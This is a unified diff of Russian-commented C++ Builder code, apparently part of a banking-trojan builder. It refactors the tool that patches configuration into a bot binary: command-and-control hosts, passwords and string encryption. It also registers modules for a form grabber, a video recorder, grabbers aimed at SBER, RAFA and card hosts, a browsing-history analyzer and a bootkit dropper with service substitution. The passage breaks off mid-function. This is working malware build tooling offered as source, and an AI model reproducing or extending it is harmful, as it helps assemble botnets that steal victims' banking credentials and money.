@@ -146,12 +146,24 @@ bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
 
 
 
+#define BUILDER_FILE_SIGNATURE 0x91A3A08A /* BOT_BUILDER_FILE */
+
+struct TBuilderFileHeader
+{
+	DWORD Signature;
+	DWORD Version;
+	DWORD Count;
+};
+
+
+
 //*****************************************************************
 //  Класс базового параметров бота
 //*****************************************************************
-TCustomParam::TCustomParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
+TBotParam::TBotParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
 	: TObject()
 {
+	FIsDynamic = false;
 	FTitle = Title;
 	FPosition = -1;
 	FEnabled = true;
@@ -172,7 +184,7 @@ TCustomParam::TCustomParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, boo
 }
 //---------------------------------------------------------------------------
 
-__fastcall TCustomParam::~TCustomParam()
+__fastcall TBotParam::~TBotParam()
 {
 	if (FOwner)
 		FOwner->RemoveItem(this);
@@ -182,7 +194,7 @@ __fastcall TCustomParam::~TCustomParam()
 //--------------------------------------------------
 //  Функция очищает данные
 //--------------------------------------------------
-void TCustomParam::Clear()
+void TBotParam::Clear()
 {
 	m_memset(FData, 0, FSize);
 	FDataSize = 0;
@@ -191,7 +203,7 @@ void TCustomParam::Clear()
 //--------------------------------------------------
 //  Функция сбрасывает информацию о позиции параметра
 //--------------------------------------------------
-void TCustomParam::ResetStatus()
+void TBotParam::ResetStatus()
 {
 	FPosition = -1;
 }
@@ -200,7 +212,7 @@ void TCustomParam::ResetStatus()
 //  Функция обновляет информацию о наличии параметра
 //  в указанном буфере
 //--------------------------------------------------
-bool TCustomParam::UpdateStatus(LPBYTE Buf, DWORD BufSize)
+bool TBotParam::UpdateStatus(LPBYTE Buf, DWORD BufSize)
 {
 	FPosition = STR::Pos(Buf, FName.c_str(), BufSize);
 	return FPosition >= 0;
@@ -209,10 +221,9 @@ bool TCustomParam::UpdateStatus(LPBYTE Buf, DWORD BufSize)
 //--------------------------------------------------
 //  Функция записывает данные парметра в буфер
 //--------------------------------------------------
-bool TCustomParam::Write(LPBYTE Buf, DWORD BufSize)
+bool TBotParam::Write(LPBYTE Buf, DWORD BufSize)
 {
-	if (!FEnabled || FPosition < 0)
-		return false;
+	if (FPosition < 0) return false;
 
 	LPBYTE Start = Buf + FPosition;
 	m_memcpy(Start, FData, FSize);
@@ -220,9 +231,93 @@ bool TCustomParam::Write(LPBYTE Buf, DWORD BufSize)
 }
 
 //--------------------------------------------------
-//  Функция записывает значение параметра
+//  Функция реальной записи значение параметра в поток
 //--------------------------------------------------
-void TCustomParam::SetValue(LPVOID Data, DWORD Size, bool Encrypt)
+void TBotParam::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
+{
+	Stream->Write(&Size, sizeof(Size));
+	if (Size) Stream->Write(Buf, Size);
+}
+
+//--------------------------------------------------
+//  Функция сохраняет значение параметра в поток
+//--------------------------------------------------
+void TBotParam::SaveToStream(TStream *Stream)
+{
+	DoSaveToStream(Stream, FData, FDataSize);
+}
+
+//--------------------------------------------------
+//  Функция реальной загрузки значения параметра из
+//  потока
+//--------------------------------------------------
+void TBotParam::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
+{
+	Buf = NULL;
+	Stream->Read(&Size, sizeof(Size));
+
+	if (Size)
+	{
+		Buf = (LPBYTE)MemAlloc(Size);
+		if (Stream->Read(Buf, Size) != Size)
+			throw Exception("Read file error!");
+    }
+}
+
+//--------------------------------------------------
+//  Функция загружает значение параметра из потока
+//--------------------------------------------------
+void TBotParam::LoadFromStream(TStream *Stream)
+{
+	Clear();
+
+	LPBYTE Buf = NULL;
+	DWORD Size = 0;
+
+	DoLoadFromStream(Stream, Buf, Size);
+
+	if (Size && Buf)
+	{
+		try {
+			SetValue(Buf, Size, false);
+		} __finally {
+            MemFree(Buf);
+		}
+    }
+}
+
+//--------------------------------------------------
+//  Функция возвращает истину если парметр активен
+//--------------------------------------------------
+bool TBotParam::GetActive()
+{
+	return FEnabled && (FPosition >= 0);
+}
+
+
+//--------------------------------------------------
+//  Функция возвращает состояние значения парметра
+//--------------------------------------------------
+TBotParamStatus TBotParam::ValueStatus()
+{
+	if (!Active || IsDynamic)
+		return psOk;
+
+	if (!FDataSize)
+	{
+		if (FNotNull)
+			return psError;
+		else
+			return psWarning;
+	}
+	return psOk;
+}
+
+
+//--------------------------------------------------
+//  Функция устанавливает значение параметра
+//--------------------------------------------------
+void TBotParam::SetValue(LPVOID Data, DWORD Size, bool Encrypt)
 {
 	Clear();
 	if (!Data || !Size) return;
@@ -239,7 +334,7 @@ void TCustomParam::SetValue(LPVOID Data, DWORD Size, bool Encrypt)
 //--------------------------------------------------
 //  Функция возвращает данные параметра как строку
 //--------------------------------------------------
-AnsiString TCustomParam::GetAsString()
+AnsiString TBotParam::GetAsString()
 {
 	AnsiString S = (PCHAR)FData;
 	if (FEncrypted)
@@ -251,7 +346,7 @@ AnsiString TCustomParam::GetAsString()
 //  Функция устанавливает значение параметра из
 //  строки
 //--------------------------------------------------
-void TCustomParam::SetAsString(const AnsiString& Value)
+void TBotParam::SetAsString(const AnsiString& Value)
 {
 	SetValue(Value.c_str(), Value.Length(), FEncrypted);
 }
@@ -260,16 +355,24 @@ void TCustomParam::SetAsString(const AnsiString& Value)
 //  Функция возвращает значение ка многострочный
 //  текст
 //--------------------------------------------------
-AnsiString TCustomParam::GetAsMultiLine()
+AnsiString TBotParam::GetAsMultiLine()
 {
+	TStrings *S = new TStringList();
 
+	TStrEnum E((PCHAR)FData, FEncrypted, 0);
+
+	while (E.Next()) S->Add(E.Line().t_str());
+
+	AnsiString Result = S->Text;
+	delete S;
+    return Result;
 }
 
 //--------------------------------------------------
 //  Функция устанавливает значение из многострочного
 //  текст
 //--------------------------------------------------
-void TCustomParam::SetAsMultiLine(const AnsiString& Value)
+void TBotParam::SetAsMultiLine(const AnsiString& Value)
 {
 	PCHAR Buf = (PCHAR)MemAlloc(FSize);
 	TStrings *S = new TStringList();
@@ -314,10 +417,45 @@ void TCustomParam::SetAsMultiLine(const AnsiString& Value)
 
 
 //--------------------------------------------------
+//  Функция возвращает значение параметра как DWORD
+//--------------------------------------------------
+DWORD TBotParam::GetAsLong()
+{
+	int Result = 0;
+	if (FDataSize)
+		TryStrToInt(AsString, Result);
+	return Result;
+}
+
+//--------------------------------------------------
+//  Функция устанавливает значение параметра как DWORD
+//--------------------------------------------------
+void TBotParam::SetAsLong(DWORD Value)
+{
+	AsString = AnsiString(Value);
+}
+
+//--------------------------------------------------
+//  Функция возвращает значение параметра как bool
+//--------------------------------------------------
+bool TBotParam::GetAsBool()
+{
+	return AsString == "1";
+}
+
+//--------------------------------------------------
+//  Функция устанавливает значение параметра как bool
+//--------------------------------------------------
+void TBotParam::SetAsBool(bool Value)
+{
+	AsString = (Value) ? "1" : "0";
+}
+
+//--------------------------------------------------
 //  Функция проверяет правильно ли записался параметр
 //  в буфер
 //--------------------------------------------------
-bool TCustomParam::CheckParam(LPBYTE Buf)
+bool TBotParam::CheckParam(LPBYTE Buf)
 {
 
 	if (FPosition < 0)
@@ -341,7 +479,7 @@ bool TCustomParam::CheckParam(LPBYTE Buf)
 //  Класс основного пароля бота
 //*****************************************************************
 TCustomPassword::TCustomPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
-	:TCustomParam(AOwner, Name, Size, Encrypted, NotNull, Title)
+	:TBotParam(AOwner, Name, Size, Encrypted, NotNull, Title)
 {
 
 }
@@ -376,6 +514,39 @@ void TCustomPassword::SetAsString(const AnsiString& Value)
 }
 
 
+//--------------------------------------------------
+//  Функция устанавливает пароль в зашифрованном виде
+//--------------------------------------------------
+void TCustomPassword::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
+{
+	inherited::DoSaveToStream(Stream, FPassword.c_str(), FPassword.Length());
+}
+
+//--------------------------------------------------
+//  Функция устанавливает пароль в зашифрованном виде
+//--------------------------------------------------
+void TCustomPassword::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
+{
+	inherited::DoLoadFromStream(Stream, Buf, Size);
+
+	if (Buf)
+	{
+		try {
+
+			AnsiString S;
+			S.SetLength(Size);
+            m_memcpy(S.c_str(), Buf, Size);
+			AsString = S;
+
+		} __finally
+		{
+			MemFree(Buf);
+			Buf = NULL;
+            Size = 0;
+		}
+    }
+}
+
 
 
 //*****************************************************************
@@ -385,6 +556,7 @@ __fastcall TCustomBotModule::TCustomBotModule(TComponent* AOwner)
 	: TComponent(AOwner)
 {
 	FItems = new TList;
+	FWriteDisabledParams = false;
 }
 //---------------------------------------------------------------------------
 
@@ -396,7 +568,7 @@ __fastcall TCustomBotModule::~TCustomBotModule()
 //---------------------------------------------------------------------------
 
 
-void TCustomBotModule::InsertItem(TCustomParam* Param)
+void TCustomBotModule::InsertItem(TBotParam* Param)
 {
 	if (Param)
 	{
@@ -406,7 +578,7 @@ void TCustomBotModule::InsertItem(TCustomParam* Param)
 }
 //---------------------------------------------------------------------------
 
-void TCustomBotModule::RemoveItem(TCustomParam* Param)
+void TCustomBotModule::RemoveItem(TBotParam* Param)
 {
 	if (Param)
 	{
@@ -423,7 +595,7 @@ void TCustomBotModule::Clear()
 {
 	for (int i = 0; i < FItems->Count; i++)
 	{
-		TCustomParam* Param = (TCustomParam*)FItems->Items[i];
+		TBotParam* Param = (TBotParam*)FItems->Items[i];
 		Param->FOwner = NULL;
 		delete Param;
 	}
@@ -455,9 +627,9 @@ bool TCustomBotModule::GetActive()
 //--------------------------------------------------
 //  Функция возвращает элемент по его индексу
 //--------------------------------------------------
-TCustomParam* TCustomBotModule::GetItems(int Index)
+TBotParam* TCustomBotModule::GetItems(int Index)
 {
-	return  (TCustomParam*)FItems->Items[Index];
+	return  (TBotParam*)FItems->Items[Index];
 }
 
 //--------------------------------------------------
@@ -501,7 +673,11 @@ bool TCustomBotModule::WriteParams(LPBYTE Buf, DWORD BufSize)
 {
 	bool Result = false;
 	for (int i = 0; i < Count; i++)
-		Result |= Items[i]->Write(Buf, BufSize);
+	{
+		TBotParam* Param = Items[i];
+		if (Param->Enabled || WriteDisabledParams)
+			Result |= Param->Write(Buf, BufSize);
+    }
 	return Result;
 }
 
@@ -509,16 +685,79 @@ bool TCustomBotModule::WriteParams(LPBYTE Buf, DWORD BufSize)
 //  Функция возвращает параметр позиция которого
 //  находится в позиции Position
 //--------------------------------------------------
-TCustomParam* TCustomBotModule::GetParamForPos(int Position)
+TBotParam* TCustomBotModule::GetParamForPos(int Position)
 {
 	for (int i = 0; i < Count; i++)
 	{
-		TCustomParam* Param = Items[i];
+		TBotParam* Param = Items[i];
 		if (Param->FPosition == Position)
 			return Param;
 	}
 
 	return NULL;
+}
+
+
+//--------------------------------------------------
+//  Функция очищает значения параметров
+//--------------------------------------------------
+void TCustomBotModule::ClearValues()
+{
+	for (int i = 0; i < Count; i++)
+		Items[i]->Clear();
+}
+
+//--------------------------------------------------
+//  Функция возвращает параметр по имени
+//--------------------------------------------------
+TBotParam* TCustomBotModule::ParamByName(const AnsiString &Name)
+{
+	for (int i = 0; i < Count; i++)
+	{
+		TBotParam* Param = Items[i];
+		if (Param->Name == Name)
+			return Param;
+	}
+	return NULL;
+}
+
+
+// Функция проверяет состояние параметров
+TBotParamStatus TCustomBotModule::CheckParamsValue(TStrings* Errors, bool FullBuild)
+{
+	TBotParamStatus Result = psOk;
+
+	for (int i = 0; i < Count; i++)
+	{
+		TBotParam* Param = Items[i];
+		bool UseParam = Param->Active && (FullBuild || Param->Enabled);
+		if (!UseParam) continue;
+
+		TBotParamStatus Status = Param->ValueStatus();
+		if (Status == psOk) continue;
+
+		// Более высокое значение статуса означает
+		// большую критичность состояния
+		if (Status > Result)
+			Result = Status;
+
+		// Добавляем строку
+		if (Errors)
+		{
+			UnicodeString Str;
+			switch (Status) {
+				case psWarning: Str = ParamStatus_Warning; break;
+				case psError:   Str = ParamStatus_Error; break;
+			}
+
+			Str += StrNoParamValue;
+			Str += Param->Title;
+
+			Errors->Add(Str);
+        }
+	}
+
+	return Result;
 }
 
 
@@ -532,11 +771,12 @@ TCustomParam* TCustomBotModule::GetParamForPos(int Position)
 __fastcall TBaseBotModule::TBaseBotModule(TComponent* AOwner)
 	: TCustomBotModule(AOwner)
 {
-	FPrefix    = new TCustomParam(this, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, true, true, ParamTitle_Prefix);
-	FHosts     = new TCustomParam(this, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, true, true, ParamTitle_Hosts);
-	FDelay     = new TCustomParam(this, BOTPARAM_DELAY, MAX_DELAY_SIZE, false, true, ParamTitle_Delay);
+	FPrefix    = new TBotParam(this, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, true, true, ParamTitle_Prefix);
+	FHosts     = new TBotParam(this, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, true, true, ParamTitle_Hosts);
+	FDelay     = new TBotParam(this, BOTPARAM_DELAY, MAX_DELAY_SIZE, false, true, ParamTitle_Delay);
 	FPassword  = new TCustomPassword(this, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, true, true, ParamTitle_Password);
 
+	FDelay->AsLong = DEFAULT_DELAY;
 }
 
 __fastcall TBaseBotModule::~TBaseBotModule()
@@ -558,7 +798,11 @@ UnicodeString TBaseBotModule::GetResultFileName()
 	UnicodeString Path = ExtractFilePath(FFileName);
 	UnicodeString Ext  = ExtractFileExt(FFileName);
 
-	return Path + Name + Ext;
+	if (!Path.IsEmpty())
+	{
+    	Path += Name + Ext;
+    }
+	return Path;
 }
 
 
@@ -590,9 +834,11 @@ bool TBaseBotModule::Close()
 //--------------------------------------------------
 //  Функция создаёт сборку
 //--------------------------------------------------
-bool TBaseBotModule::Buld()
+bool TBaseBotModule::Build(bool FullBuild)
 {
 	if (!Active) return false;
+
+	WriteDisabledParams = FullBuild;
 
 	// Открываем файл
 	DWORD  Size = 0;
@@ -605,15 +851,355 @@ bool TBaseBotModule::Buld()
 	// Сохраняем результат
 	if (Result)
 	{
-        Result = File::WriteBufferW(ResultFileName.w_str(), Buf, Size) == Size;
+		Result = File::WriteBufferW(ResultFileName.w_str(), Buf, Size) == Size;
 	}
 
 	// Уничтожаем данные
 	MemFree(Buf);
 
+	// Проверяем результат сборки
+	if (Result)
+	{
+		TBuildChecker* Checker = new TBuildChecker(NULL, this);
+		try {
+			Result = Checker->Check();
+		} __finally {
+			delete Checker;
+		}
+    }
+
     return Result;
 }
 
+
+//===========================================================================
+
+//*****************************************************************
+//  Модуль дополнительных настроек бота
+//*****************************************************************
+
+__fastcall TBotModule::TBotModule(TBotBuilder *ABuilder, const UnicodeString &Name)
+	: TCustomBotModule(ABuilder)
+{
+	FBuilder = ABuilder;
+	FBuilder->FModules->Add(this);
+	FModuleName = Name;
+	FEdit = NULL;
+}
+
+__fastcall TBotModule::~TBotModule()
+{
+
+}
+
+//--------------------------------------------------
+//  Добавление параметров переводим владельцу
+//  модуля
+//--------------------------------------------------
+void TBotModule::InsertItem(TBotParam* Param)
+{
+	inherited::InsertItem(Param);
+	FBuilder->InsertItem(Param);
+}
+
+void TBotModule::RemoveItem(TBotParam* Param)
+{
+
+}
+
+void TBotModule::Clear()
+{
+
+}
+
+//--------------------------------------------------
+//  функция возвращает истину если модуль может
+//  быть отредактирован
+//--------------------------------------------------
+bool TBotModule::CanEdit()
+{
+	return FEdit != NULL;
+}
+
+
+//--------------------------------------------------
+//  функция активирует редактор модуля
+//--------------------------------------------------
+bool TBotModule::Edit()
+{
+	return (FEdit) ? FEdit->Execute(this) : false;
+}
+
+//===========================================================================
+
+
+
+
+
+//*****************************************************************
+//  Модуль дополнительных настроек бота
+//*****************************************************************
+__fastcall TBotBuilder::TBotBuilder(TComponent *AOwner)
+	: TBaseBotModule(AOwner)
+{
+	FModules = new TList();
+
+    // Создаём парамт пароля шифрования строк
+	FSessionPassword = new TBotParam(this, BOTPARAM_SESSION_PASSW, MAX_SESSION_PASSW_SIZE, false, false, "");
+	FSessionPassword->IsDynamic = true;
+	FSessionPassword->AsString  = "---";
+
+	// Создаём криптор строк
+	FSringsEncryptor = new TBotStringsEncryptor(this);
+	FSringsEncryptor->Password = FSessionPassword;
+
+	// Инициализируем дополнительные модули
+	TBotModule* Module;
+
+	// Модуль Hunter
+	Module = new TBotModule(this, Module_Hunter);
+	new TBotParam(Module, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, HUNTER_PARAM_ENCRYPTED, false, "Ссылки модуля Hunter");
+
+	// Модуль формграбера
+	Module = new TBotModule(this, Module_FormGraber);
+	new TBotParam(Module, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, FGRFILTER_PARAM_ENCRYPTED_URLS, false, "Ссылки формграбера");
+	new TBotParam(Module, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, false, "Маски пост данных");
+
+	// Нстройки видеорекордера
+	Module = new TBotModule(this, Module_VideoRecorder);
+	new TBotParam(Module, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, VIDEOREC_PARAM_ENCRYPTED_HOST, true,  "Сервер записи видео №1");
+	new TBotParam(Module, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, VIDEOREC_PARAM_ENCRYPTED_HOST, false, "Сервер записи видео №2");
+	new TBotParam(Module, VIDEOREC_PARAM_NAME_URLS, VIDEOREC_PARAM_SIZE_URLS, VIDEOREC_PARAM_ENCRYPTED_URLS,  false, "Адреса старта записиси видео");
+
+	// JAVA Config
+	Module = new TBotModule(this, Module_JavaConfig);
+	new TBotParam(Module, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, JAVA_PARAM_ENCRYPTED, true, "Ссылки JAVA");
+
+	// Ссылки AZ
+	Module = new TBotModule(this, Module_AzConfig);
+	new TBotParam(Module, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, AZCONFIG_PARAM_ENCRYPTED_AZUSER, true, "Имя пользователя AZ");
+
+	// Настройки грабера сбер
+	Module = new TBotModule(this, Module_SberHosts);
+	new TBotParam(Module, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, SBERHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера SBER");
+
+	// Настройки параметров рафы
+	Module = new TBotModule(this, Module_RafaHosts);
+	new TBotParam(Module, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, RAFAHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера RAFA");
+
+	// Настройки системы CC
+	Module = new TBotModule(this, Module_CCHosts);
+	new TBotParam(Module, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, ССHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера CC");
+
+	// Настройки анализатора истории навигации
+	Module = new TBotModule(this, Module_HistoryAnalyzer);
+	new TBotParam(Module, BOTPARAM_HISANALIZERLINKS, BOTPARAM_SIZE_HISANALIZERLINKS, BOTPARAM_ENCRYPTED_HISANALIZERLINKS, true, "Ссылки анализатора истории навигации");
+
+
+	// Настройки дропера буткита
+	TBotParam *p;
+	Module = new TBotModule(this, Module_BootkitDroper);
+	    new TBotParam(Module, Param_DroperNamePrefix, 0, false, true, "Превикс дропера буткита");
+		new TBotParam(Module, Param_TargetPlatform,   0, false, true, "Платформа назначения дропера буткита");
+	p = new TBotParam(Module, Param_SVCFuckupEnabled, 0, false, true, "Использовать SVC подмену дропером буткита");
+	p->AsString = "0";
+}
+
+
+__fastcall TBotBuilder::~TBotBuilder()
+{
+	delete FModules;
+}
+//-----------------------------------------------------------------------------
+
+
+//--------------------------------------------------
+//  Функция сохраняет значения параметров в поток
+//--------------------------------------------------
+void TBotBuilder::SaveToStream(TStream *Stream)
+{
+
+	// Записываем загоовок файла
+	TBuilderFileHeader H;
+	H.Signature = BUILDER_FILE_SIGNATURE;
+	H.Version   = BUILDER_VERSION;
+	H.Count     = Count;
+
+	Stream->Write(&H, sizeof(H));
+
+	// Записываем параметры
+	for (int i = 0; i < Count; i++)
+	{
+		TBotParam* P = Items[i];
+		DWORD NameLen = P->Name.Length();
+
+		// Записываем имя парамера
+		Stream->Write(&NameLen, sizeof(NameLen));
+
+		AnsiString Name = P->Name;
+		Name.Unique();
+		Decrypt(Name.c_str(), Name.c_str());
+
+		Stream->Write(Name.c_str(), NameLen);
+
+		// Записываем данные параметра
+        P->SaveToStream(Stream);
+	}
+}
+
+
+//--------------------------------------------------
+//  Функция загружает значения параметров из потока
+//--------------------------------------------------
+void TBotBuilder::LoadFromStream(TStream *Stream)
+{
+	// Загружаем настройки из потока данных
+	ClearValues();
+
+	// Читаем заголовок
+	TBuilderFileHeader H;
+
+	int Readed = Stream->Read(&H, sizeof(H));
+
+	// Проверяем правильность заголовка
+	if ( Readed < sizeof(H) || H.Signature != BUILDER_FILE_SIGNATURE)
+		throw Exception(Error_InvalidParamsFile);
+
+    // Загружаем настройки параметров
+	for (DWORD i = 0; i < H.Count; i++)
+	{
+		// Читаем имя параметра
+		DWORD NameLen = 0;
+		Stream->Read(&NameLen, sizeof(NameLen));
+
+		AnsiString Name;
+		Name.SetLength(NameLen);
+		Readed = Stream->Read(Name.c_str(), NameLen);
+		if (Readed != NameLen)
+			throw Exception(Error_InvalidParamsFile);
+
+		Decrypt(Name.c_str(), Name.c_str());
+
+		// Читаем данные параметра
+		TBotParam* Param = ParamByName(Name);
+		if (Param)
+			Param->LoadFromStream(Stream);
+		else
+		{
+			// Параметр не найден, пропускаем блок
+			DWORD Size = 0;
+			Stream->Read(&Size, sizeof(Size));
+			Stream->Position = Stream->Position + Size;
+        }
+	}
+}
+
+//--------------------------------------------------
+//  Функция сохраняет значения параметров в файл
+//--------------------------------------------------
+void TBotBuilder::SaveToFile(const UnicodeString &FileName)
+{
+	TFileStream *S = new TFileStream(FileName, fmCreate);
+	try {
+
+		SaveToStream(S);
+
+	} __finally
+	{
+		delete S;
+	}
+}
+
+//--------------------------------------------------
+//  Функция загружает значения параметров из файла
+//--------------------------------------------------
+void TBotBuilder::LoadFromFile(const UnicodeString &FileName)
+{
+	TFileStream *S = new TFileStream(FileName, fmOpenRead);
+	try {
+
+		LoadFromStream(S);
+
+	} __finally
+	{
+		delete S;
+	}
+}
+
+
+
+//--------------------------------------------------
+//  Функция устанавливает редактор модуля
+//--------------------------------------------------
+void TBotBuilder::SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit)
+{
+	TBotModule* Module = ModuleByName(Name);
+	if (Module)
+        Module->FEdit = Edit;
+}
+
+
+//--------------------------------------------------
+//  Функция возвращает модуль с именем Name
+//--------------------------------------------------
+TBotModule* TBotBuilder::ModuleByName(const UnicodeString &Name)
+{
+	for (int i = 0; i < FModules->Count; i++)
+	{
+		TBotModule* Module = (TBotModule*)FModules->Items[i];
+		if (Module->ModuleName == Name)
+			return Module;
+	}
+
+	return NULL;
+}
+
+//--------------------------------------------------
+//  Функция возвращает количество модулей
+//--------------------------------------------------
+int TBotBuilder::GetModulesCount()
+{
+	return FModules->Count;
+}
+
+//--------------------------------------------------
+//  Функция возвращает модуль по индексу
+//--------------------------------------------------
+TBotModule* TBotBuilder::GetModules(int Index)
+{
+	return (TBotModule*)FModules->Items[Index];
+}
+
+
+//--------------------------------------------------
+//  Функция ввыполняет сборку билда
+//--------------------------------------------------
+bool TBotBuilder::Build(bool FullBuild)
+{
+
+	// Создаём сесионный пароль
+	FSessionPassword->AsString = Random::RandomString2(MAX_SESSION_PASSW_SIZE - 1, 'a', 'z').t_str();
+
+	return inherited::Build(FullBuild);
+}
+
+
+//--------------------------------------------------
+//  Функция возвращает естину если включено
+//  шифрование строк
+//--------------------------------------------------
+bool TBotBuilder::GetEncryptStrings()
+{
+	return FSringsEncryptor->Enabled;
+}
+
+//--------------------------------------------------
+//  Функция включает/отключает шифрование строк
+//--------------------------------------------------
+void TBotBuilder::SetEncryptStrings(bool Value)
+{
+	FSringsEncryptor->Enabled = Value;
+}
 
 
 //===========================================================================
@@ -621,11 +1207,13 @@ bool TBaseBotModule::Buld()
 
 
 
-class TStringsPasswordParam : public TBotParam
+
+
+class TStringsPasswordParam : public TOldBotParam
 {
 public:
-	__fastcall TStringsPasswordParam(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)
-		: TBotParam(AOwner, NotNull, Encrypted, Name, Size, Title)
+	__fastcall TStringsPasswordParam(TOldBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)
+		: TOldBotParam(AOwner, NotNull, Encrypted, Name, Size, Title)
 	{
 
     }
@@ -640,54 +1228,35 @@ public:
 
 
 //****************************************************************************
-//                             TBotBuilder
+//                             TOldBotBuilder
 //****************************************************************************
 
 
-#define BUILDER_FILE_SIGNATURE 0x91A3A08A /* BOT_BUILDER_FILE */
-
-struct TBuilderFileHeader
-{
-	DWORD Signature;
-	DWORD Version;
-	DWORD Count;
-};
-
-
-__fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
+__fastcall TOldBotBuilder::TOldBotBuilder(TComponent* AOwner)
 	: TComponent(AOwner)
 {
 	FFile = new TMemoryStream();
-	FParams = new TCollection(__classid(TBotParam));
-	FModules = new TCollection(__classid(TBotModule));
+	FParams = new TCollection(__classid(TOldBotParam));
+	FModules = new TCollection(__classid(TOldBotModule));
 	FActiveModules = new TList();
 
-	// Инициализируем классы для шифрования строк
-	FStringsEncryptor = new TBotStringsEncryptor(this);
-
-	FStringsPassword  = new TStringsPasswordParam(NULL, false, false, BOTPARAM_SESSION_PASSW, MAX_SESSION_PASSW_SIZE, "Пароль шифрования строк");
-	FStringsPassword->AsAnsiString = "----";
 
 	// Добавляем основные параметры
-	FPrefix    = new TBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
-	FHosts     = new TBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, ParamTitle_Hosts);
-	FDelay     = new TBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
-	FPassword  = new TBotPassword(this, true, true, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, ParamTitle_Password);
+	FPrefix    = new TOldBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
+	FHosts     = new TOldBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, ParamTitle_Hosts);
+	FDelay     = new TOldBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
+	FPassword  = NULL;
 
 
 	// Hunter
-	TBotModule* Module = AddModule(Module_BankHosts);
+	TOldBotModule* Module = AddModule(Module_BankHosts);
 	Module->AddParam(true, BOTPARAM_ENCRYPTED_BANKHOSTS, BOTPARAM_BANKHOSTS, MAX_BANKHOSTS_BUF_SIZE, ParamTitle_BankHosts);
 
 
 
-	FDelay->AsLong = DEFAULT_DELAY;
-
-    InitializeModules();
-
 }
 
-__fastcall TBotBuilder::~TBotBuilder()
+__fastcall TOldBotBuilder::~TOldBotBuilder()
 {
 	delete FParams;
 	delete FModules;
@@ -696,12 +1265,10 @@ __fastcall TBotBuilder::~TBotBuilder()
 }
 
 // Функция загружает исходный файл
-void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
+void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 {
 	FFile->Size = 0;
 	FSourceFileName = "";
-	UpdateResultFileName(true);
-	DeactivateModules();
 
 
 	TFileStream* S = new TFileStream(FileName, fmOpenRead);
@@ -712,11 +1279,6 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 		delete S;
 	}
 
-
-
-	FSourceFileName = FileName;
-	UpdateResultFileName(false);
-	ActivateModules();
 }
 
 //-----------------------------------------------------
@@ -726,9 +1288,9 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 //            сборка, при которой свойство параметров
 //            Enabled будет игнорироваться
 //-----------------------------------------------------
- bool __fastcall TBotBuilder::Build(bool FullBuild)
+ bool __fastcall TOldBotBuilder::Build(bool FullBuild)
 {
-	if (FFile->Size == 0)
+/*	if (FFile->Size == 0)
 		throw Exception(Error_NoSourceFile);
 
     Message(Status_StartBuild);
@@ -742,7 +1304,7 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
 	TStringList* Errors = new TStringList();
 
-	TBotParamStatus Status = CheckParams(Errors, FullBuild);
+	TBotParamStatus Status = CheckParamsValue(Errors, FullBuild);
 
 	UnicodeString ErrorText = Errors->Text;
     delete Errors;
@@ -783,10 +1345,10 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
 
 		// Шифруем данные DLL
-		EncryptDllData(Buf, BufSize, StrPass);
+		//EncryptDllData(Buf, BufSize, StrPass);
 
 		// Шифруем строки бота
-		FStringsEncryptor->Encrypt(Buf, BufSize, StrPass);
+		//FStringsEncryptor->Encrypt(Buf, BufSize, StrPass);
 		STR::Free(StrPass);
 
 		// Записываем пароль для строк
@@ -795,7 +1357,7 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 		// Вшиваем параметры
 		for (int i = 0; i < Count; i++)
